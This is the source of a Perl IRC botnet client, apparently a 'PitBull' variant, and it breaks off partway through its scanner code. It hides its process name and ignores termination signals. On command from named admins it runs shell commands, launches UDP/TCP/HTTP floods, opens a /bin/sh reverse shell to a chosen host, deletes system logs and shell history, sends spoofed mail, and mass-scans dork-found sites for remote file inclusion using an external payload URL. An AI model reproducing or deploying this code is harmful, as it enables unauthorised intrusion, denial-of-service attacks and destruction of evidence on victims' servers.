#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;

my $processo = '[httpd]';
my $linas_max='4';
my $sleep='6';
my $cmd="[PHP-SHELL]";
my $id="http://www.nextreme.it/no/id.txt?";
my @adms=("k4l0nk","PLaTo","BackBones","Abank");
my @canais=("#bot");
my @nickname = ("MomoX".int(rand(1000)));
my $nick = $nickname[rand scalar @nickname];
my $ircname ='ngangkang';
chop (my $realname = 'bukan sesiapa');
$servidor='irc.menutd.info' unless $servidor;
my $porta='1980';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line");
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION mIRC v6.17 PitBull\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }

#End of Connect

######################
#      PREFIX        #
#                    #
######################
# You can change the prefix if you want but the commands will be different
# The standard prefix is !x if you change it into !xitch for example
# every command will be like !xitch @udpflood, !xitch @googlescan.
# So its recommended not to change this ;)
######################

  if ($args =~ /^(\Q$meunick\E|\!x)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!x" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
######################
#   End of PREFIX    #
#                    #
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(999999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

######################
#       Help         #
#                    #
######################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 Scanner edit by 2MasterKid");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@rfi");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@commands");

}

if ($funcarg =~ /^ddos/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 There are 3 DDos in this bot");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 UDPFlood, HTTPFlood and TCPFlood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@udpflood 3<ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@tcpflood 3<ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@httpflood 3<site> <time>");

}

#if ($funcarg =~ /^rfi/) {
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 This bot also contains a RFI Scanner.");
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 That contains the engines :12G4o8o12g9l4e4, 7M4S7N4, 7All7The7Web4, 14A4S14K4, 7AOL, 1L7yc1o7s4, 2Y6ahoo ");
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 Commands :");
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@rfi 3<vuln> <dork>");
#	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 You can find strings here : http://www.xshqiptaretx.org/strings.txt ");
#
#}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 You use backconnect like this :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@back 3<ip><port>");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 This bot has a integrated shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 You can use it in private but also public in the channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 In public channel just use : 2!x cd tmp3 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 For help with the linux commands type :!x 2@linuxhelp");
}

if ($funcarg =~ /^portscanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 There is a normal portscan and a Nmap:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@portscan 3<ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@nmap 3<ip> <beginport> <endport>");
}

if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 You can use the following commands :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@portscan 3<ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@nmap 3<ip> <beginport> <endport>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@back 3<ip><port>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x cd tmp for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@udpflood 3<ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@tcpflood 3<ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@httpflood 3<site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@rfi 3<vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@logcleaner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@sendmail 3<subject> <sender> <recipient> <message>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@milw0rm");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@join #channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Help14)3 !x 2@part #channel");
}

if ($funcarg =~ /^linuxhelp/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Dir where you are : pwd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Start a Perl file : perl file.pl");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Go back from dir : cd ..");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Force to Remove a file/dir : rm -rf file/dir;ls -la");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Show all files/dir with permissions : ls -lia");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Find config.inc.php files : find / -type f -name config.inc.php");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Find all writable folders and files : find / -perm -2 -ls");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Find all .htpasswd files : find / -type f -name .htpasswd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2 Find all service.pwd files : find / -type f -name service.pwd");
}

######################
#   End of  Help     #
#                    #
######################

######################
#     Commands       #
#                    #
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Info BOT : 3 $servidor : $porta");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Uname -a     : 3 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Uptime       : 3 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Own Prosses  : 3 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2ID           : 3 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Own Dir      : 3 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2OS           : 3 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Owner        : 3 achap");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :2Channel      : 3 #upsi@WebChat");
}

if ($funcarg =~ /^milw0rm/) {
	my @ltt=();
	my @bug=();
	my $x;
	my $page="";
	my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
	print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	my @r = <$socke>;
	$page="@r";
	close($socke);
	while ($page =~  m/<title>(.*)</g){
	$x = $1;
	if ($x =~ /\&lt\;/) {
	$x =~ s/\&lt\;/</g;
	}
	if ($x !~ /milw0rm/) {
	push (@bug,$x);
	}}
	while ($page =~  m/<link.*expl.*([0-9]...)</g) {
	if ($1 !~ m/milw0rm.com|exploits|en/){
	push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
	}}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2milw0rm14)3 Latest exploits :");
	foreach $x (0..(@ltt - 1)) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2milw0rm14)3 $bug[$x] - $ltt[$x]");
	sleep 1;
}}

######################
#      Portscan      #
#                    #
######################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Scanning14)3 Scan Untuk Port yang Terbuka".$1." 3Tunggu!.");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }

  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Scanning14)3 Port yang Terbuka: @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Scanning14)3 Tiada.");
  }
}

######################
#  End of  Portscan  #
#                    #
######################

######################
#        Nmap        #
#                    #
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner);
       sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Nmap14)2Port: $1 3Ports $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl ::14(2Nmap14) 3Dapat 3 $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl ::14(2Nmap14)3 3Selesai!");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Nmap14)3 3Tiada");
             }
			 }
######################
#    End of Nmap     #
#                    #
######################

#
######################
#    Log Cleaner     #
#                    #
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2LogCleaned14)3 3Tunggu..");
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log';
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2LogCleaned14)3 Default log and bash_history file dihapus.");
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2LogCleaned14)3 Hapuskan machine log file.");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2LogCleaned14)3 Semua log telah dihapuskan.");
      }
######################
# End of Log Cleaner #
#                    #
######################
#
# The PitBull !!!!
#
######################
#       MAILER       #
#                    #
######################
# For mailing use :
# !x @sendmail <subject> <sender> <recipient> <message>
#
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Mailer14)3 Pengiriman ke :14 $3");
$subject = $1;
$sender = $2;
$recipient = $3;
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n";
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Mailer14)3 Mail Dikirim ke :14 $recipient");
}
######################
#   End of MAILER    #
#                    #
######################
######################
#  Join And Part     #
#                    #
######################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }

######################
#End of Join And Part#
#                    #
######################

######################
#     TCPFlood       #
#                    #
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2DDos14)3 14 ".$1.":".$2." 3for 14 ".$3." 3seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :14(2DDos14)3 Penembakan selesai 14 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   #
#                    #
######################

######################
#   Back Connect     #
#                    #
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Backconnect14)3 Konek ke 14 $host:$porta");
}
}
######################
#End of  Back Connect#
#                    #
######################

######################
#    MULTI SCANNER   #
#                    #
######################
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
### Start Message
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4netcat12)7 wE lOad the bug:1 $bug ");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4netcat12)7 wE lOad the dOrk:1 $dork ");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4netcat12)14 let's rock this party. ");
### End of Start Message
# Starting Google
	my @glist=&google($dork);
push(my @tot, @glist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4g00gle12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4g00gle12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4g00gle12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @mlist=&msn($dork);
push(my @tot, @mlist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4mSn12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4mSn12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4mSn12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @allist=&alltheweb($dork);
push(my @tot, @allist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aLLthewEb12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aLLthewEb12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aLLthewEb12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @asklist=&ask($dork);
push(my @tot, @asklist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aSk12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aSk12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aSk12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @uollist=&uol($dork);
push(my @tot, @uollist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4uoL12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4uoL12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4uoL12)7 sCaN fiNniShed for $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(7);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /k4l0nk/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 7OFF14): 4$print ");
sendraw($IRC_cur_socket, "PRIVMSG k4l0nk :14(2Safe Mode = 7OFF14): 4$print ");
}}
elsif($re =~ /k4l0nk/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl :14(2Safe Mode = 3ON14): 12$print ");
}}
}}}
exit;
}}

#
if ($funcarg =~ /^rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @alist=&altavista($dork);
push(my @tot, @alist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aLtaviSta12) 2".scalar(@tot)." 3sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12(10@4aLtaviSta12)7 wE have cLeaNed 2".scalar(@puliti)." 3sites");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %50==0){
#sendraw($IRC_cur_socket, "PRIVMSG $printl :3Exploiting1 ".$contatore." 3of1 ".$uni. " 3Sites");
}
if ($contatore==$uni-1){
